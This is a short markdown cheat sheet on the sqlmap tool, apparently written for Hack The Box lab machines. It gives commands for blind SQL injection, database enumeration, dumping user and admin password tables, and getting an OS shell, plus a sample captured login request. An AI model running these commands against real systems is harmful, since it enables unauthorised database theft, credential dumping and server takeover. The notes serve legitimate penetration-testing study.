# Sqlmap

Sqlmap is a tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers.

## Blind SQL injection

We can inject SQL code but not see the output.

```bash
sqlmap -u "ws://soc-player.soccer.htb:9091" --data '{"id": "*"}' --dbs --threads 10 --
level 5 --risk 3 --batch
```

- `-u` Target URL
- `--data` Data string to be sent through POST (e.g. "id=1")
- `--dbs` Enumerate DBMS databases
- `--threads` Max number of concurrent HTTP(s) requests (default 1)
- `--level` Level of tests to perform (1-5, default 1)
- `--risk` Risk of tests to perform (1-3, default 1)
- `--batch` Never ask for user input, use the default behavior

If we found a DB we can dump its content with:

```bash
sqlmap -u <URL> --data '{"<FIELD>": "*" }' --threads <NUMBER> -D <database_name> --dump --batch
```

- `D` DBMS database to enumerate
- `--dump` Dump DBMS database table entries

To obtain a reverse shell we can use:

```bash
sqlmap -u <URL> --data '{"<FIELD>": "*" }' --threads <NUMBER> --os-shell --batch
```

More examples

```
sqlmap -D usage_blog --threads 10 -T admin_users,users -C username,password --batch --dump -r ~/Documents/Proyectos/hack-the-box/machines/usage/req_password --ignore-code 401
```

Where:

- `-D` DBMS database to enumerate
- `-T` DBMS database tables to enumerate
- `-C` DBMS database table columns to enumerate

And we can use a request file to avoid the need of the URL:

```bash
sqlmap -r <request_file> --threads <NUMBER> --os-shell --batch
```

A request file would look something like this:

```
POST /dirb_safe_dir_rf9EmcEIx/admin/dologin.php HTTP/1.1
Host: www.securewebinc.jet
Content-Length: 25
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://www.securewebinc.jet
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/login.php
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=2jn4imainfddc3vatcddfoafg5
Connection: close

username=admin&password=a
```

## Docs

- https://github.com/sqlmapproject/sqlmap/wiki/Usage